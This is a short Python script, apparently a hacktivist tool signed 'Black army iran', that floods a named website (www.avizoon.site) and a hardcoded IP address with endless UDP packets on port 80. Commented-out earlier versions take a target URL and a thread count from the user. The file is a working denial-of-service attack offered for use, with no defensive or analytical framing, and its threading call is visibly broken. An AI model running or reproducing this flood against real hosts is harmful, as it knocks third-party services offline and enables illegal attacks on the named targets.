# import socket

# def attac():
#  mess = "black army iran black army iran black army iran "
#  ip = "103.224.182.223"
#  port = 80
#  def ddos(i):
#     while True:
#         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#         sock.sendto(bytes(mess,"UTF-8"), (ip, port))
#         print("Packet Sent")

# attac()
# import time
# import socket
# import sys
# import _thread
# site = input("Enter your site url => ")
# thread_count = input("Enter your thread => ")
# ip = socket.gethostbyname(site)
# UDP_PORT = 80
# MESSAGE = 'virus32'
# print("UDP target IP:", ip)
# print("UDP target port:", UDP_PORT)
# time.sleep(3)
# def ddos(i):
#     while 1:
#         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
#         print("Packet Sent")
# for i in range(int(thread_count)):
#     try:
#         _thread.start_new_thread(ddos, ("Thread-" + str(i),))
#     except KeyboardInterrupt:
#         sys.exit(0)
# while 1:
#     pass

import socket
import threading
Site = "www.avizoon.site"
port = 80
mess = "Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY Black army iran Black army \n\n\n\n\n\n\n\n\n\n\n\n\n\n IRAN \n\t BLACKARMY"
ip   = socket.gethostbyname(Site)
def attac():

   while True: 
    sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
    sock.sendto(bytes(mess,"UTF-8"),(ip,port))
    print("packet send")

while 1<5000:
    threading.Thread(target=attac()).start
